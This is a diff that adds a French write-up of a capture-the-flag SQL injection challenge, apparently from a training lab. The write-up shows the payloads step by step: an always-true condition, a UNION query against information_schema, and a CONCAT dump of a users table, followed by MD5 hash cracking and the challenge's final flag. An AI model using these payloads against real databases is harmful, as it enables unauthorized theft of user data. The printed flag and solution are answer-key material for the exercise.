@@ -1,0 +1,23 @@
+-1 Je verifies si l’input ne possède pas de validation et donc utilise directement la donnée brut dans la requête SQL: 
+cmd: 1 OR 1=1 (Condition toujours vrai) permettra l’injection SQL renverra des donnees
+
+-2 J’ai un retour d’info corerspondant visiblement a des utilisateur, on peut donc exploiter la faille SQL
+
+-3 Je tente de récupérer le nom des tables et de leurs colonnes en requetant le les métadonnée de la BDD (information schema), en précisant que je souhaite connaitre table_name, column_name :
+cmd: 1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
+
+-4 J’obtient la liste de toutes les tables et leurs column associe. Je cherche donc celle qui m’intéresse a savoir celle des utilisateur, je trouve donc ‘users’ ainsi que les column associées: user_id, first_name, last_name, town, country, planet, Commentaire, countersign
+
+-5 Je veux désormais affiches toute les donnes des columns relative a la tables users grace a la commande
+Le select renvoi 2 column, ne connaissant pas au préalable celle qui mintereses, je vais donc utiliser une concatenation afin de pouvoir recup tout les column
+
+cmd: 1 OR 1=1 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM `users`
+
+-6 J’obtient ainsi toutes les donnes utilisateur, et je trouve la donne suivant qui semble être celle à exploiter (de par son nom explicite):
+ID: 1 OR 1=1 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM `users` 
+First name: 5
+Surname : FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
+
+Si je suis ce qui ecrit: je dois décrypter (donc un hash) le password, le mettre en minuscule et le chiffre en SHA256, ce qui correspondra au flag. Ce qui s’apparent au hash semble être 5ff9d0165b4f92b14994e5c685cdce28, il faut désormais trouve le type de chiffrement.
+
+Je peux observer deux chose: la tailler, 32 caractere, et les caractères utiliser , hexadecimal (0-9 et a-f). La taille de signature est donc 128bit. Je récupère une liste des différents chiffrement utilisant ces conditions, celui le plus utilise est MD5, je le test et jobtient “FortyTwo”. Je met ces caractère en minuscule, le hash en 256 grace a la commande echo -n fortytwo | shasum -a 256: et jobtient le flag : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
